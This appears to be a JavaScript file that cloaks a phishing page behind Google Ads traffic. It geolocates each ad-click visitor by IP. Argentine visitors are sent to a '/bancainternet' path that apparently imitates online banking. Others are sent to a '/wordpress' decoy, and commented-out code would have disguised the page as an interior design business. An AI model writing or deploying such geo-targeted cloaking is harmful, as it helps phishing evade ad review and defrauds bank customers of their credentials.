async function getIpClient() {
    const response = await fetch('https://api.ipify.org?format=json');
    var data = await response.json();
    const response2 = await fetch('http://ip-api.com/json/'+data.ip);
    var data2 = await response2.json();

    if(data2.country == 'Argentina'){
        window.location.replace("/bancainternet");
        return false;
    }
    return true;
}

function transformationSite(){
    window.location.replace("/wordpress");
 /*  
    //ICON
    var link = document.createElement('link'); 
    link.type = 'image/x-icon'; link.rel = 'shortcut icon'; 
    link.href = '/bancainternet/img/1946488.png'; 
    document.getElementsByTagName('head')[0].appendChild(link);

    //TITLE
    newPageTitle = 'Minimal Home | Expertos en diseño de interiores y exteriores';
    document.querySelector('title').textContent = newPageTitle;

    //BACKGROUND
    document.querySelector('#top-section').style.backgroundImage = "url('/bancainternet/img/interior-has-armchair-empty-white-wall.jpg')";

    //PRELOADER
    document.querySelector('#preloader').style.display = "none";

    //Top Section
    document.querySelector('#top-section').style.display = "flex";

    //YASTA
    document.querySelector('#content-general').style.display = "block";
    */
}

//Obtener identificador original
const queryString = window.location.search;
const urlParams = new URLSearchParams(queryString);
//identificador listo
const googleAds = urlParams.get('gclid');

if(googleAds){ 
    getIpClient().then((data) => {
        if(data){
            transformationSite();
        }
    })
}else{
    transformationSite();
}



//----------------------------------


/*const imgContent = document.querySelectorAll(".img-content-hover");

function showImgContent(e) {
  for (var i = 0; i < imgContent.length; i++) {
    x = e.pageX;
    y = e.pageY;
    imgContent[i].style.transform = `translate3d(${x}px, ${y}px, 0)`;
  }
}

document.addEventListener("mousemove", showImgContent);*/
